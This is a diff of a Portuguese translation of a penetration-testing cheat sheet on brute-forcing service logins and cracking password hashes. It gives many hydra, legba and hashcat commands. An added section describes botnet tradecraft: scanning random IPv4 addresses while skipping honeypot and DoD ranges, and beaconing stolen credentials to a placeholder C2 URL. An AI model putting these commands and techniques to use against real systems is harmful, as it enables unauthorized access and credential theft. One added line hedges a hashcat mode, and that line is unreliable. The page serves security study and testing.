@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Credenciais Padrão
+## Default Credentials
 
-**Procure no Google** credenciais padrão da tecnologia que está sendo usada, ou **tente estes links**:
+**Pesquise no google** por default credentials da tecnologia que está sendo usada, ou **tente estes links**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -21,7 +21,7 @@
 
 ## **Crie seus próprios Dicionários**
 
-Obtenha o máximo de informações possível sobre o alvo e gere um dicionário personalizado. Ferramentas que podem ajudar:
+Encontre o máximo de informações sobre o target que puder e gere um dicionário personalizado. Ferramentas que podem ajudar:
 
 ### Crunch
 ```bash
@@ -34,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Wordlists baseadas em websites
+### Listas de palavras baseadas em websites
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -47,13 +47,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Gerar passwords com base no seu conhecimento da vítima (nomes, datas...)
+Gera senhas com base no seu conhecimento sobre a vítima (nomes, datas...)
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Uma ferramenta geradora de wordlists que permite fornecer um conjunto de palavras, possibilitando criar múltiplas variações a partir das palavras fornecidas e gerar uma wordlist única e ideal para usar contra um target específico.
+Uma ferramenta geradora de wordlists, que permite fornecer um conjunto de palavras, dando-lhe a possibilidade de criar múltiplas variações a partir das palavras fornecidas, gerando uma wordlist única e ideal para usar contra um alvo específico.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +74,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Wordlists
+### Listas de palavras
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -87,9 +87,17 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Serviços
+## Internet-wide bruteforcer workflow (lessons from Go-based scanners)
 
-Ordenados em ordem alfabética pelo nome do serviço.
+- Mantenha **pools de workers ajustados à arquitetura** (por exemplo, ~95 goroutines em `x86_64/arm64`, ~85 em `i686`, ~50 em low-end ARM) e faça respawn a cada segundo para manter **concorrência fixa**, com cada worker lidando exatamente com um IP alvo antes de sair.
+- Gere **IPv4 públicos aleatórios** mas descarte ranges obviamente cheios de honeypots ou não roteáveis: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, `/8`s com grande presença em cloud (`3/15/16/56`) e `/8`s associados ao DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- Probe a porta do serviço com um timeout curto (~2s) antes de tentar **logins em cleartext** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin sobre HTTP/80) e caia para uma **pequena lista de credenciais builtin** se o fetch remoto do dicionário/C2 falhar.
+- Exfiltre hits via pequenos beacons HTTP GET como `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (códigos de serviço como `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) enquanto reutiliza um User-Agent comum de browser para se misturar.
+- phpMyAdmin spray pode brute-forcear dezenas de caminhos prováveis (~80+) com `GET /index.php?lang=en`, detectar marcadores PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) e parsear `codemirror.css?v=X.Y.Z` para ramificar a autenticação: versões `<4.9` aceitam params GET `pma_username`/`pma_password`; versões `>=4.9` exigem POST com `server=1`, CSRF `token`, e as mesmas creds.
+
+## Services
+
+Ordered alphabetically by service name.
 
 ### AFP
 ```bash
@@ -162,7 +170,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-Para http**s** você deve mudar de "http-post-form" para "**https-post-form"**
+Para http**s** você tem que mudar de "http-post-form" para "**https-post-form"**
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla ou (D)rupal ou (M)oodle
 ```bash
@@ -288,7 +296,7 @@ Para usar **oracle_login** com **patator** você precisa **instalar**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** e **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versões 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** e **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -410,13 +418,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Chaves SSH fracas / Debian PRNG previsível
+#### Chaves SSH fracas / Debian predictable PRNG
 
-Alguns sistemas têm falhas conhecidas na semente aleatória usada para gerar material criptográfico. Isso pode resultar numa redução dramática do espaço de chaves, que pode ser bruteforced com ferramentas como [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Conjuntos pré-gerados de chaves fracas também estão disponíveis, como [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Alguns sistemas têm falhas conhecidas na semente aleatória usada para gerar material criptográfico. Isso pode resultar em um keyspace dramaticamente reduzido que pode ser bruteforced com ferramentas tais como [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Conjuntos pré-gerados de chaves fracas também estão disponíveis, como [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ e OpenMQ)
 
-O protocolo de texto STOMP é um protocolo de mensagens amplamente usado que **permite comunicação e interação transparente com serviços populares de fila de mensagens** como RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Ele fornece uma abordagem padronizada e eficiente para trocar mensagens e executar várias operações de mensagens.
+O protocolo de texto STOMP é um protocolo de mensageria amplamente usado que **permite comunicação e interação contínuas com serviços populares de fila de mensagens** tais como RabbitMQ, ActiveMQ, HornetQ e OpenMQ. Ele fornece uma abordagem padronizada e eficiente para trocar mensagens e executar várias operações de mensageria.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -456,21 +464,21 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 ## Local
 
-### Bancos de dados online de cracking
+### Bancos de dados online para cracking
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 com/sem ESS/SSP e com qualquer valor do challenge)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, e arquivos MSOffice, ZIP, PDF...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 com/sem ESS/SSP e com qualquer valor de challenge)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, capturas WPA2 e arquivos MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hashes e file hashes)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes e hashes de arquivos)
 - [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
 - [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Confira isto antes de tentar brute force uma Hash.
+Confira isto antes de tentar brute force em um Hash.
 
 ### ZIP
 ```bash
@@ -490,7 +498,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-Você precisa conhecer o **plaintext** (ou parte do plaintext) **de um arquivo contido dentro** do zip criptografado. Você pode verificar os **filenames e o tamanho dos arquivos contidos** em um zip criptografado executando: **`7z l encrypted.zip`**\
+Você precisa conhecer o **plaintext** (ou parte do plaintext) **de um arquivo contido** no zip criptografado. Você pode verificar **filenames e o tamanho dos arquivos contidos** em um zip criptografado executando: **`7z l encrypted.zip`**\
 Baixe [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)da página de releases.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -523,9 +531,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### Senha de proprietário do PDF
+### Senha Owner do PDF
 
-Para quebrar a senha de proprietário de um PDF, veja isto: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Para quebrar uma senha Owner de PDF, confira isto: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -579,7 +587,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-Outro tutorial de Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Mais um tutorial Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -587,7 +595,7 @@ Outro tutorial de Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-### PGP/GPG Chave privada
+### PGP/GPG Private key
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
@@ -598,14 +606,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Use [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) e depois john
+Utilize [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) e depois john
 
-### Coluna Protegida por Senha do Open Office
+### Open Office Pwd Protected Column
 
 Se você tiver um arquivo xlsx com uma coluna protegida por senha, você pode desprotegê-la:
 
-- **Faça upload dele para google drive** e a senha será removida automaticamente
-- Para **removê-la** **manualmente**:
+- **Faça upload para google drive** e a senha será removida automaticamente
+- Para **remover** isso **manualmente**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -623,7 +631,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
 ## Ferramentas
 
-**Exemplos de hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
+**Exemplos de Hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
 ### Hash-identifier
 ```bash
@@ -637,9 +645,9 @@ hash-identifier
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Wordlist Generation Tools**
+### **Ferramentas de geração de Wordlists**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gerador avançado de keyboard-walk com base chars, keymap e routes configuráveis.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gerador avançado de keyboard-walk com caracteres base configuráveis, keymap e rotas.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -654,16 +662,16 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 #### Hashcat attacks
 
-- **Wordlist attack** (`-a 0`) with rules
+- **Wordlist attack** (`-a 0`) com regras
 
-**Hashcat** já vem com uma **folder containing rules**, mas você pode encontrar [**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** já vem com uma **pasta contendo regras** mas você pode encontrar [**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-- **Wordlist combinator** attack
+- **Wordlist combinator** ataque
 
 É possível **combinar 2 wordlists em 1** com hashcat.\
-Se a lista 1 contivesse a palavra **"hello"** e a segunda contivesse 2 linhas com as palavras **"world"** e **"earth"**, as palavras `helloworld` e `helloearth` seriam geradas.
+Se a lista 1 contivesse a palavra **"hello"** e a segunda contivesse 2 linhas com as palavras **"world"** e **"earth"**. As palavras `helloworld` e `helloearth` serão geradas.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -718,7 +726,90 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Por favor cole aqui o conteúdo (ou trecho) do arquivo src/generic-hacking/brute-force.md que você quer que eu traduza. Mantendo exatamente a mesma sintaxe Markdown/HTML; não traduzirei código, nomes de técnicas, links, paths ou tags.
+Cracking Linux Hashes - /etc/shadow file
+========================================
+
+Visão geral
+----------
+O arquivo /etc/shadow contém os hashes das senhas dos usuários do sistema. Ele é legível apenas por root e armazena, para cada usuário, o hash (com salt) e alguns metadados (tempo de expiração, etc.). Para realizar cracking offline é comum extrair as linhas de /etc/shadow e combinar com /etc/passwd (ou usar tools que façam isso automaticamente) para obter pares username:hash para as ferramentas de cracking.
+
+Formato do /etc/shadow
+----------------------
+Cada linha tem vários campos separados por dois-pontos:
+
+username:password:lastchg:min:max:warn:inactive:expire:flag
+
+- username — nome do usuário.
+- password — o campo contém o hash ou sinalizadores especiais:
+  - vazio ou "*" — sem senha configurada / login desabilitado.
+  - "!" ou "!!" — conta bloqueada.
+  - quando há um hash, costuma estar no formato modular crypt: $id$salt$hash
+- lastchg, min, max, warn, inactive, expire, flag — metadados de senha/expiração.
+
+Exemplo de linha:
+```
+root:$6$rounds=5000$somesalt$somehash:18295:0:99999:7:::
+```
+Nesse exemplo `$6$` indica SHA-512 crypt, com parâmetro rounds (número de iterações).
+
+Tipos de hash (ids comuns)
+--------------------------
+- $1$ — MD5 crypt
+- $2a$, $2y$ — bcrypt
+- $5$ — SHA-256 crypt
+- $6$ — SHA-512 crypt
+
+Extração e preparação de hashes
+-------------------------------
+Para usar ferramentas como john ou Hashcat, normalmente precisamos de um arquivo com os hashes (e às vezes um arquivo combinando usernames).
+
+- Para combinar /etc/passwd e /etc/shadow para john:
+  - use `unshadow /etc/passwd /etc/shadow > combined.txt`
+- Se o sistema usava `pwconv`/`pwunconv`, ou se houver contas sem senha, ajuste conforme necessário.
+
+Cracking com john
+-----------------
+- Teste básico:
+  ```
+  john --wordlist=/path/to/wordlist.txt combined.txt
+  ```
+- Para usar rules:
+  ```
+  john --wordlist=/path/to/wordlist.txt --rules combined.txt
+  ```
+- Para detectar tipos automaticamente, john costuma identificar hashes; se necessário force o formato com `--format=...`.
+
+Cracking com Hashcat
+--------------------
+- Identifique o mode adequado para cada id:
+  - SHA-512 crypt -> mode 1800 (ex.: `-m 1800`)
+  - SHA-256 crypt -> mode 7400 or 500? (confirme na documentação do Hashcat; modes mudam entre versões)
+  - bcrypt -> mode 3200
+  - MD5 crypt -> mode 500
+- Exemplo de uso:
+  ```
+  hashcat -m 1800 -a 0 hashes.txt /path/to/wordlist.txt
+  ```
+- Para performance, use regras, masks, combinator attacks, ou markov/mask-based attacks conforme o alvo.
+
+Dicas e considerações
+---------------------
+- Salt é armazenado junto ao hash; isso apenas previne tabelas rainbow genéricas, mas não impede brute-force offline.
+- Rounds (iterações) aumentam custo computacional de cada tentativa; sistemas modernos usam mais rounds.
+- Contas com senha vazia ou com "!" / "*" não são atacáveis da mesma forma — verifique o significado antes de tentar cracking.
+- Sempre respeite leis e escopo: realize cracking apenas em ambientes autorizados (pentesting legal / com permissão).
+- Use wordlists atualizadas (ex.: rockyou.txt), regras, e ferramentas de fingerprinting de hashes para escolher os modos corretos.
+
+Recursos úteis
+--------------
+- john
+- Hashcat
+- wordlists (rockyou, SecLists)
+- unshadow / pwunconv
+
+Nota final
+----------
+Cracking de hashes é um processo intensivo em recursos. Otimize usando GPUs com Hashcat quando possível, escolha wordlists e regras adequadas, e priorize contas com hashes mais fracos (e.g., MD5 criptográfico ou senhas curtas/fáceis).
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
@@ -730,7 +821,7 @@ Cracking Windows Hashes
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-# Cracking Hashes de Aplicações Comuns
+Cracking de Hashes Comuns de Aplicações
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -740,4 +831,8 @@ Cracking Windows Hashes
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
+## Referências
+
+- [Por dentro do GoBruteforcer: configurações padrão de servidor geradas por IA, senhas fracas e campanhas focadas em criptomoedas](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+
 {{#include ../banners/hacktricks-training.md}}
